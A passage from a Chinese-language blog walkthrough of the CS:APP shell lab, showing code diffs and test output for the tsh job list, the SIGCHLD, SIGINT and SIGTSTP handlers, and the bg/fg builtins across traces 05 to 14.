<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父进程等待前台作业停止</span></span><br><span class="line"><span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        unix_error(<span class="string">"waitfg: waipid error"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid),pid, cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是我们发现，我们的输出jid是0，而<code>tshref</code>输出是1，这我们到后面再解决（这涉及添加作业到全局作业列表中。）</p>
<h3 id="05"><a href="#05" class="headerlink" title="05"></a>05</h3><p>在这个测试中，我们主要实现对全局作业列表的修改。</p>
<p>我们先修改eval函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addjob(jobs, pid, bg ? BG : FG ,cmdline);</span><br><span class="line">   <span class="comment">// 父进程等待前台作业停止</span></span><br><span class="line">   <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">       <span class="keyword">int</span> status;</span><br><span class="line">       <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           unix_error(<span class="string">"waitfg: waipid error"</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>当我们手动测试的时候，即：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make</span><br><span class="line">./tsh</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash">  ./myspin 20 &amp;</span></span><br><span class="line">[1] (835379)  ./myspin 20 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 20 &amp;</span></span><br><span class="line">[2] (835441) ./myspin 20 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> <span class="built_in">jobs</span></span></span><br><span class="line">[1] (835379) Running  ./myspin 20 &amp;</span><br><span class="line">[2] (835441) Running ./myspin 20 &amp;</span><br></pre></td></tr></table></figure>

<p>我们发现，我们是可以正常运行的，但是当我们使用下面的方式进行测试的时候，我们发现我们的输出并不一致：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make test05</span><br><span class="line">./sdriver.pl -t trace05.txt -s ./tsh -a "-p"</span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> trace05.txt - Process <span class="built_in">jobs</span> <span class="built_in">builtin</span> <span class="built_in">command</span>.</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 2 &amp;</span></span><br><span class="line">[2] (837522) ./myspin 2 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> ./myspin 3 &amp;</span></span><br><span class="line">[4] (837524) ./myspin 3 &amp;</span><br><span class="line"><span class="meta">tsh&gt;</span><span class="bash"> <span class="built_in">jobs</span></span></span><br><span class="line">[1] (837521) Foreground /bin/echo -e tsh&gt; ./myspin 2 \046</span><br><span class="line">[2] (837522) Running ./myspin 2 &amp;</span><br><span class="line">[3] (837523) Foreground /bin/echo -e tsh&gt; ./myspin 3 \046</span><br><span class="line">[4] (837524) Running ./myspin 3 &amp;</span><br><span class="line">[5] (837525) Foreground /bin/echo tsh&gt; jobs</span><br></pre></td></tr></table></figure>

<p>这是因为我们没有及时把已完成的作业从作业列表中删除，这个我们放到后面再解决。</p>
<h3 id="06"><a href="#06" class="headerlink" title="06"></a>06</h3><p>在这个测试中， 要求我们完成对<code>SIGINT</code>信号的处理，即在<code>sigint_handler</code>函数中，我们要把<code>SIGINT</code>信号发送到整个前台进程组，参考教材和实验说明，我们应该使用<code>-pid</code>，同时在创建子进程后，我们应该调用<code>setpgid(0, 0)</code>设置当前进程的进程组ID为当前进程ID。</p>
<p>默认情况下，一个进程收到<code>SIGINT</code>时，会被终止，而每当子进程终止时候，会触发<code>sigchld_handler</code>函数，我们这时候需要进一步完善该函数。在该函数中，我们要区分是由于正常结束而触发事件，还是其他信号而触发的事件。</p>
<p>此外，为了顺便将已完成的前台作业从作业列表中删除，我们要修改eval函数，我们之前在判断是前台作业后，使用的是<code>waitpid</code>，但是我们为了能够在<code>sigchld_handler</code>函数中，回收子进程，我们在<code>sigchld_handler</code>函数中使用了<code>waitpid</code>,结合实验说明，在判断是前台作业后，我们应该调用<code>waitfg</code>，而该函数中，我们使用<code>sleep</code>函数将父进程挂起一段时间（只要前台作业没结束）。</p>
<p>还有最重要的一点就是，涉及全局变量修改的地方，需要避免出现竞争情况（参考教材P541），例如我们得确保addjob在deletejob之前。</p>
<p>这次改动地方比较多：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- a/shell/tsh.c</span><br><span class="line">+++ b/shell/tsh.c</span><br><span class="line">@@ <span class="number">-168</span>,<span class="number">6</span> +<span class="number">168</span>,<span class="number">8</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">int</span> bg;</span><br><span class="line">     <span class="keyword">pid_t</span> pid;</span><br><span class="line"></span><br><span class="line">+    <span class="keyword">sigset_t</span> mask_all,mask_one,prev_one;</span><br><span class="line">+</span><br><span class="line">     <span class="built_in">strcpy</span>(buf, cmdline);</span><br><span class="line">     bg = parseline(buf, argv);</span><br><span class="line">     <span class="keyword">if</span> (argv[<span class="number">0</span>] == <span class="literal">NULL</span>) &#123;</span><br><span class="line">@@ <span class="number">-176</span>,<span class="number">20</span> +<span class="number">178</span>,<span class="number">34</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">eval</span><span class="params">(<span class="keyword">char</span>* cmdline)</span> </span>&#123;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="comment">// 如果不是内置命令</span></span><br><span class="line">     <span class="keyword">if</span> (!builtin_cmd(argv)) &#123;</span><br><span class="line">+        <span class="comment">// 将每个信号添加到set中</span></span><br><span class="line">+        sigfillset(&amp;mask_all);</span><br><span class="line">+        <span class="comment">// 初始化空集合</span></span><br><span class="line">+        sigemptyset(&amp;mask_one);</span><br><span class="line">+        <span class="comment">// 将 SIGCHLD 信号添加到集合中</span></span><br><span class="line">+        sigaddset(&amp;mask_one, SIGCHLD);</span><br><span class="line">+        <span class="comment">// 暂时阻塞 SIGCHLD 信号，避免由于操作系统调用的原因，导致addjob在deletejob之后</span></span><br><span class="line">+        sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one);</span><br><span class="line">+</span><br><span class="line">         <span class="keyword">if</span> ((pid = fork()) == <span class="number">0</span>) &#123;</span><br><span class="line">             <span class="comment">// 子进程</span></span><br><span class="line">+            <span class="comment">// 恢复信号集合，解除对 SIGCHLD 的阻塞（子进程继承了父进程的阻塞设置，因此它无法接收子进程的信号，所以我们必须解除阻塞）</span></span><br><span class="line">+            sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">+            setpgid(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">             <span class="keyword">if</span> (execve(argv[<span class="number">0</span>], argv, environ) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">"%s: Command not found.\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                 <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">+        <span class="comment">// 阻塞SIGCHLD</span></span><br><span class="line">+        sigprocmask(SIG_BLOCK, &amp;mask_all, <span class="literal">NULL</span>);</span><br><span class="line">+</span><br><span class="line">         addjob(jobs, pid, bg ? BG : FG ,cmdline);</span><br><span class="line">+        <span class="comment">// 解除阻塞SIGCHLD</span></span><br><span class="line">+        sigprocmask(SIG_SETMASK, &amp;prev_one, <span class="literal">NULL</span>);</span><br><span class="line">         <span class="comment">// 父进程等待前台作业停止</span></span><br><span class="line">         <span class="keyword">if</span> (!bg) &#123;</span><br><span class="line">-            <span class="keyword">int</span> status;</span><br><span class="line">-            <span class="keyword">if</span> (waitpid(pid, &amp;status, <span class="number">0</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">-                unix_error(<span class="string">"waitfg: waipid error"</span>);</span><br><span class="line">-            &#125;</span><br><span class="line">+            waitfg(pid);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, pid2jid(pid),pid, cmdline);</span><br><span class="line">@@ <span class="number">-292</span>,<span class="number">6</span> +<span class="number">308</span>,<span class="number">10</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  * waitfg - Block until <span class="built_in">process</span> pid is no longer the foreground <span class="built_in">process</span></span><br><span class="line">  */</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">+    <span class="keyword">while</span>(fgpid(jobs))&#123;</span><br><span class="line">+        <span class="comment">// 挂起 500 微妙</span></span><br><span class="line">+        usleep(<span class="number">500</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-307</span>,<span class="number">6</span> +<span class="number">327</span>,<span class="number">38</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">waitfg</span><span class="params">(<span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">   *     currently <span class="built_in">running</span> children to <span class="built_in">terminate</span>.</span><br><span class="line">   */</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">+    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">+    <span class="keyword">sigset_t</span> mask_all,prev_all;</span><br><span class="line">+    sigfillset(&amp;mask_all);</span><br><span class="line">+    <span class="keyword">int</span> status;</span><br><span class="line">+    <span class="keyword">pid_t</span> pid;</span><br><span class="line">+</span><br><span class="line">+    <span class="comment">// tsh进程等待它的所有进程，采用非阻塞的方式</span></span><br><span class="line">+    <span class="keyword">while</span>((pid = waitpid(<span class="number">-1</span>, &amp;status, WNOHANG | WUNTRACED)) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">+        <span class="comment">// 如果是正常结束的进程</span></span><br><span class="line">+        <span class="keyword">if</span>(WIFEXITED(status))&#123;</span><br><span class="line">+</span><br><span class="line">+            sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">+            deletejob(jobs, pid);</span><br><span class="line">+            sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">+        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(WIFSIGNALED(status))&#123;</span><br><span class="line">+</span><br><span class="line">+            <span class="comment">// 如果是通过被信号终止的进程</span></span><br><span class="line">+            struct <span class="keyword">job_t</span>* current_job = getjobpid(jobs, pid);</span><br><span class="line">+            <span class="keyword">int</span> jid = current_job-&gt;jid;</span><br><span class="line">+            sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">+            <span class="comment">// 删除该作业</span></span><br><span class="line">+            <span class="keyword">if</span>(deletejob(jobs, pid))&#123;</span><br><span class="line">+                <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) terminated by signal %d\n"</span>, jid, pid, WTERMSIG(status));</span><br><span class="line">+            &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">+                app_error(<span class="string">"Job terminated failed\n"</span>);</span><br><span class="line">+            &#125;</span><br><span class="line">+            sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">+        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">+            <span class="built_in">printf</span>(<span class="string">"DEBUG (%d) other situation %d\n"</span>, pid, sig);</span><br><span class="line">+        &#125;</span><br><span class="line">+    &#125;</span><br><span class="line">+    errno = olderrno;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">@@ <span class="number">-316</span>,<span class="number">6</span> +<span class="number">368</span>,<span class="number">18</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  *    to the foreground job.</span><br><span class="line">  */</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">+    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">+    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">+    sigfillset(&amp;mask);</span><br><span class="line">+    sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">+    <span class="comment">// 获取当前前台作业的进程ID</span></span><br><span class="line">+    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">+    sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">+    <span class="comment">// 不为零时，代表存在前台作业</span></span><br><span class="line">+    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">+        kill(-pid, sig);</span><br><span class="line">+    &#125;</span><br><span class="line">+    errno = olderrno;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="07"><a href="#07" class="headerlink" title="07"></a>07</h3><p>这一部分主要测试我们是否能够在输入ctrl-c时候，只把该信号发送给前台作业，而不影响后台作业，即我们先创建一个在作业在后台运行，然后再创建一个前台作业，再输入ctrl-c，此时前台作业应该被停止，当我们输入<code>jobs</code>时候，只会一个后台作业（前提是我们要迅速输入<code>jobs</code>，防止后台作业完成了）。</p>
<p>如果<code>06</code>的代码修改没问题的话，这一个测试是可以直接过的。</p>
<h3 id="08"><a href="#08" class="headerlink" title="08"></a>08</h3><p>这一部分主要是测试我们是否能够在输入ctrl-z时候，只把该信号发送给前台作业，而不影响后台作业。</p>
<p>这个也没什么难度，参照着对ctrl-c的处理方式即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- a/shell/tsh.c</span><br><span class="line">+++ b/shell/tsh.c</span><br><span class="line">@@ <span class="number">-354</span>,<span class="number">6</span> +<span class="number">354</span>,<span class="number">14</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">sigchld_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">                 app_error(<span class="string">"Job terminated failed\n"</span>);</span><br><span class="line">             &#125;</span><br><span class="line">             sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">+        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (WIFSTOPPED(status))&#123;</span><br><span class="line">+            struct <span class="keyword">job_t</span>* current_job = getjobpid(jobs, pid);</span><br><span class="line">+            <span class="keyword">int</span> jid = current_job-&gt;jid;</span><br><span class="line">+            sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">+            <span class="comment">// 修改该作业为停止状态</span></span><br><span class="line">+            current_job-&gt;state = ST;</span><br><span class="line">+            sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">+            <span class="built_in">printf</span>(<span class="string">"Job [%d] (%d) stopped by signal %d\n"</span>, jid, pid, WSTOPSIG(status));</span><br><span class="line">         &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">"DEBUG (%d) other situation %d\n"</span>, pid, sig);</span><br><span class="line">         &#125;</span><br><span class="line">@@ <span class="number">-389</span>,<span class="number">6</span> +<span class="number">397</span>,<span class="number">18</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">sigint_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">  *     foreground job by sending it a SIGTSTP.</span><br><span class="line">  */</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">sigtstp_handler</span><span class="params">(<span class="keyword">int</span> sig)</span> </span>&#123;</span><br><span class="line">+    <span class="keyword">int</span> olderrno = errno;</span><br><span class="line">+    <span class="keyword">sigset_t</span> mask, prev;</span><br><span class="line">+    sigfillset(&amp;mask);</span><br><span class="line">+    sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev);</span><br><span class="line">+    <span class="comment">// 获取当前前台作业的进程ID</span></span><br><span class="line">+    <span class="keyword">pid_t</span> pid = fgpid(jobs);</span><br><span class="line">+    sigprocmask(SIG_SETMASK, &amp;prev, <span class="literal">NULL</span>);</span><br><span class="line">+    <span class="comment">// 不为零时，代表存在前台作业</span></span><br><span class="line">+    <span class="keyword">if</span>(pid)&#123;</span><br><span class="line">+        kill(-pid, sig);</span><br><span class="line">+    &#125;</span><br><span class="line">+    errno = olderrno;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="09"><a href="#09" class="headerlink" title="09"></a>09</h3><p>这一部分主要是测试我们是否处理内置命令<code>bg</code>,该命令发送SIGCONT信号，重启并在后台运行作业。因此我们要完善<code>do_bgfg</code>函数，在这个函数中，我们要先判断是<code>bg</code>还是<code>fg</code>，再判断该作业是由<code>jid</code>还是<code>pid</code>给出</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- a/shell/tsh.c</span><br><span class="line">+++ b/shell/tsh.c</span><br><span class="line">@@ <span class="number">-85</span>,<span class="number">6</span> +<span class="number">85</span>,<span class="number">9</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">app_error</span><span class="params">(<span class="keyword">char</span>* msg)</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">typedef</span> <span class="keyword">void</span> <span class="title">handler_t</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"> <span class="function"><span class="keyword">handler_t</span>* <span class="title">Signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">handler_t</span>* handler)</span></span>;</span><br><span class="line"></span><br><span class="line">+</span><br><span class="line">+<span class="function"><span class="keyword">int</span> <span class="title">string2num</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> start)</span></span>;</span><br><span class="line">+</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * main - The shell's main routine</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">@@ <span class="number">-297</span>,<span class="number">10</span> +<span class="number">300</span>,<span class="number">46</span> @@ <span class="function"><span class="keyword">int</span> <span class="title">builtin_cmd</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;     <span class="comment">/* not a builtin command */</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">+<span class="function"><span class="keyword">int</span> <span class="title">string2num</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> start)</span></span>&#123;</span><br><span class="line">+    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">+    <span class="keyword">for</span>(<span class="keyword">int</span> i = start; str[i] != <span class="string">'\0'</span>; i++)&#123;</span><br><span class="line">+        ans = ans * <span class="number">10</span> + str[i] - <span class="string">'0'</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+    <span class="keyword">return</span> ans;</span><br><span class="line">+&#125;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * do_bgfg - Execute the builtin bg and fg commands</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">+    <span class="keyword">sigset_t</span> mask_all,prev_all;</span><br><span class="line">+    sigfillset(&amp;mask_all);</span><br><span class="line">+    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">+        <span class="comment">// bg 命令</span></span><br><span class="line">+        <span class="keyword">int</span> jid;</span><br><span class="line">+        <span class="keyword">pid_t</span> pid;</span><br><span class="line">+        <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">select_job</span> = <span class="title">NULL</span>;</span></span><br><span class="line">+        <span class="comment">// 如果是以 jid 方式标识</span></span><br><span class="line">+        <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>)&#123;</span><br><span class="line">+            jid = string2num(argv[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">+            select_job = getjobjid(jobs, jid);</span><br><span class="line">+            pid = select_job-&gt;pid;</span><br><span class="line">+        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">+            <span class="comment">// 如果是以 pid 方式标识</span></span><br><span class="line">+            pid = string2num(argv[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">+            select_job = getjobpid(jobs, pid);</span><br><span class="line">+            jid = select_job-&gt;jid;</span><br><span class="line">+        &#125;</span><br><span class="line">+        sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">+        <span class="comment">// 修改job状态为后台运行</span></span><br><span class="line">+        select_job-&gt;state = BG;</span><br><span class="line">+        sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">+        kill(-pid, SIGCONT);</span><br><span class="line">+        <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, select_job-&gt;jid, select_job-&gt;pid, select_job-&gt;cmdline);</span><br><span class="line">+    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">+        <span class="comment">// fg 命令</span></span><br><span class="line">+    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">+        app_error(<span class="string">"not bg or fg command\n"</span>);</span><br><span class="line">+    &#125;</span><br><span class="line">     <span class="keyword">return</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<h3 id="10"><a href="#10" class="headerlink" title="10"></a>10</h3><p>这一部分主要是测试我们是否处理内置命令<code>bg</code>,该命令发送SIGCONT信号，重启并在前台运行作业。参照09即可：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- a/shell/tsh.c</span><br><span class="line">+++ b/shell/tsh.c</span><br><span class="line">@@ <span class="number">-337</span>,<span class="number">6</span> +<span class="number">337</span>,<span class="number">26</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"[%d] (%d) %s"</span>, select_job-&gt;jid, select_job-&gt;pid, select_job-&gt;cmdline);</span><br><span class="line">     &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"fg"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">         <span class="comment">// fg 命令</span></span><br><span class="line">+        <span class="keyword">int</span> jid;</span><br><span class="line">+        <span class="keyword">pid_t</span> pid;</span><br><span class="line">+        <span class="class"><span class="keyword">struct</span> <span class="title">job_t</span>* <span class="title">select_job</span> = <span class="title">NULL</span>;</span></span><br><span class="line">+        <span class="comment">// 如果是以 jid 方式标识</span></span><br><span class="line">+        <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>)&#123;</span><br><span class="line">+            jid = string2num(argv[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">+            select_job = getjobjid(jobs, jid);</span><br><span class="line">+            pid = select_job-&gt;pid;</span><br><span class="line">+        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">+            <span class="comment">// 如果是以 pid 方式标识</span></span><br><span class="line">+            pid = string2num(argv[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">+            select_job = getjobpid(jobs, pid);</span><br><span class="line">+            jid = select_job-&gt;jid;</span><br><span class="line">+        &#125;</span><br><span class="line">+        sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">+        <span class="comment">// 修改job状态为前台运行</span></span><br><span class="line">+        select_job-&gt;state = FG;</span><br><span class="line">+        sigprocmask(SIG_SETMASK,&amp;prev_all,<span class="literal">NULL</span>);</span><br><span class="line">+        kill(-pid, SIGCONT);</span><br><span class="line">+        waitfg(pid);</span><br><span class="line">     &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">         app_error(<span class="string">"not bg or fg command\n"</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<h3 id="11"><a href="#11" class="headerlink" title="11"></a>11</h3><p>在这个测试中， 调用<code>mysplit</code>，而该程序运行后会创建若干个进程，然后测试<code>SIGINT</code>信号能否传播到前台进程组中的每个进程，我们观察下面的输出，只要除了进程ID不一样，其他都一样的话，则算满足：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">make rtest11</span><br><span class="line">make test11</span><br></pre></td></tr></table></figure>

<h3 id="12"><a href="#12" class="headerlink" title="12"></a>12</h3><p>同上，只不过测试的是SIGTSTP</p>
<h3 id="13"><a href="#13" class="headerlink" title="13"></a>13</h3><p>同上，只不过测试的是Restart ，即<code>fg</code>命令</p>
<h3 id="14"><a href="#14" class="headerlink" title="14"></a>14</h3><p>在这个测试中，主要是针对一些错误情况，例如输入的命令不符合标准，我们只要对原先的程序进行修改即可。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">--- a/shell/tsh.c</span><br><span class="line">+++ b/shell/tsh.c</span><br><span class="line">@@ <span class="number">-311</span>,<span class="number">6</span> +<span class="number">311</span>,<span class="number">15</span> @@ <span class="function"><span class="keyword">int</span> <span class="title">string2num</span><span class="params">(<span class="keyword">char</span> *str, <span class="keyword">int</span> start)</span></span>&#123;</span><br><span class="line">  * do_bgfg - Execute the builtin bg <span class="keyword">and</span> fg commands</span><br><span class="line">  */</span><br><span class="line"> <span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">+    <span class="keyword">if</span>(argv[<span class="number">1</span>] == <span class="literal">NULL</span>)&#123;</span><br><span class="line">+        <span class="built_in">printf</span>(<span class="string">"%s command requires PID or %%jobid argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">+        <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">+    <span class="comment">// bg 或者 fg 后面的参数既不是数字也不是%</span></span><br><span class="line">+    <span class="keyword">if</span> ( (argv[<span class="number">1</span>][<span class="number">0</span>] &lt; <span class="string">'0'</span> || argv[<span class="number">1</span>][<span class="number">0</span>] &gt; <span class="string">'9'</span>)  &amp;&amp; argv[<span class="number">1</span>][<span class="number">0</span>] != <span class="string">'%'</span>) &#123;</span><br><span class="line">+        <span class="built_in">printf</span>(<span class="string">"%s: argument must be a PID or %%jobid\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">+        <span class="keyword">return</span>;</span><br><span class="line">+    &#125;</span><br><span class="line">     <span class="keyword">sigset_t</span> mask_all,prev_all;</span><br><span class="line">     sigfillset(&amp;mask_all);</span><br><span class="line">     <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="number">0</span>], <span class="string">"bg"</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">@@ <span class="number">-322</span>,<span class="number">11</span> +<span class="number">331</span>,<span class="number">19</span> @@ <span class="function"><span class="keyword">void</span> <span class="title">do_bgfg</span><span class="params">(<span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">         <span class="keyword">if</span>(argv[<span class="number">1</span>][<span class="number">0</span>] == <span class="string">'%'</span>)&#123;</span><br><span class="line">             jid = string2num(argv[<span class="number">1</span>], <span class="number">1</span>);</span><br><span class="line">             select_job = getjobjid(jobs, jid);</span><br><span class="line">+            <span class="keyword">if</span>(select_job == <span class="literal">NULL</span>)&#123;</span><br><span class="line">+                <span class="built_in">printf</span>(<span class="string">"%s: No such job\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">+                <span class="keyword">return</span>;</span><br><span class="line">+            &#125;</span><br><span class="line">             pid = select_job-&gt;pid;</span><br><span class="line">         &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">             <span class="comment">// 如果是以 pid 方式标识</span></span><br><span class="line">             pid = string2num(argv[<span class="number">1</span>], <span class="number">0</span>);</span><br><span class="line">             select_job = getjobpid(jobs, pid);</span><br><span class="line">+            <span class="keyword">if</span> (select_job == <span class="literal">NULL</span>) &#123;</span><br><span class="line">+                <span class="built_in">printf</span>(<span class="string">"(%s): No such process\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">+                <span class="keyword">return</span>;</span><br><span class="line">+            &#125;</span><br><span class="line">             jid = select_job-&gt;jid;</span><br><span class="line">         &#125;</span><br><span class="line">         sigprocmask(SIG_BLOCK,&amp;mask_all,&amp;prev_all);</span><br><span class="line">@@ <span class="number">-344</span>,<span class="number">11</span> 